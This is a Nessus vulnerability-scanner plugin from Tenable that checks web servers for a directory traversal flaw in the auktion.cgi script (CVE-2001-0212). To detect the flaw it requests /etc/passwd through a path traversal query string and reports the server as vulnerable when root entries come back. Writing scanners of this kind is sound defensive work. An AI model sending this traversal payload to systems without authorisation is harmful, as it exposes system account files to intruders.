#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10638);
 script_bugtraq_id(2367);
 script_osvdb_id(527);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2001-0212");
 
 script_name(english:"HIS AUktion auktion.cgi Traversal Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/auktion.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is running an application that is affected by a
remote command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'auktion.cgi' cgi is installed. This CGI has a well known security
flaw that lets an attacker execute arbitrary commands with the
privileges of the http daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Feb/64" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/03/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/02/12");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);

foreach d (cgi_dirs())
{
  u = strcat(d, "/auktion.cgi?menue=../../../../../../../../../etc/passwd");
  r = http_send_recv3(method:"GET", item: u, port:port, exit_on_fail: 1);
  buf = strcat(r[0], r[1], '\r\n', r[2]);
  if (egrep(pattern:".*root:.*:0:[01]:.*", string:buf))
  {
    extra = '\nThe following URL exhibits the flaw :\n' 
    	  + build_url(port:port, qs: u) + '\n';
    if (report_verbosity > 1)
      extra += '\nIt produced the following output :\n' + buf + '\n';
    
    security_hole(port:port, extra: extra);
    exit(0);
  }
}
